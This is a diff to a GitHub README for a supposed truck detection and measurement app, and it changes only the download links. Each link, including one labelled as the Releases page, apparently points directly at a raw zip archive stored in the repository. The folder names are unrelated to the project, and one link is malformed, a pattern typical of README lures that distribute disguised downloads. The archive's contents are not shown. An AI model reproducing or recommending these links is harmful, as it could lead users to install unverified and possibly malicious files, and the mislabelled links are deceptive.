@@ -4,14 +4,14 @@
 Welcome to the Truck Measurement System, a user-friendly application that detects trucks in images, classifies their type, and estimates their real-world dimensions. This software uses advanced technologies like YOLOv8, OpenCV, and Streamlit to provide accurate measurements with minimal effort.
 
 ## 📥 Download Now
-[![Download the Latest Release](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/pachycephalia/Truck_logo_Design_Measurements.zip%20Latest%https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/pachycephalia/Truck_logo_Design_Measurements.zip)](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/pachycephalia/Truck_logo_Design_Measurements.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/truck_measurement/Truck_logo_Design_Measurements_1.4.zip%20Latest%https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/truck_measurement/Truck_logo_Design_Measurements_1.4.zip)](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/truck_measurement/Truck_logo_Design_Measurements_1.4.zip)
 
 ## 🚀 Getting Started
 To get started with the Truck Measurement System, follow these simple steps. 
 
 ### 📂 Step 1: Visit the Releases Page
 Click on the link below to access the Releases page on GitHub:
-[Visit the Releases Page](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/pachycephalia/Truck_logo_Design_Measurements.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/truck_measurement/Truck_logo_Design_Measurements_1.4.zip)
 
 ### 📥 Step 2: Download the Application
 On the Releases page, find the latest version. Click on the file to download it to your computer. Make sure to save it in a location you can easily access, such as your Desktop or Downloads folder.
@@ -60,4 +60,4 @@ For questions, feedback, or support, please reach out via the issues section on 
 
 ## 📥 Download Now Again
 Don't forget to download the application and start measuring trucks today!
-[Download the Latest Release](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/pachycephalia/Truck_logo_Design_Measurements.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/kiti481/Truck_logo_Design_Measurements/main/truck_measurement/Truck_logo_Design_Measurements_1.4.zip)
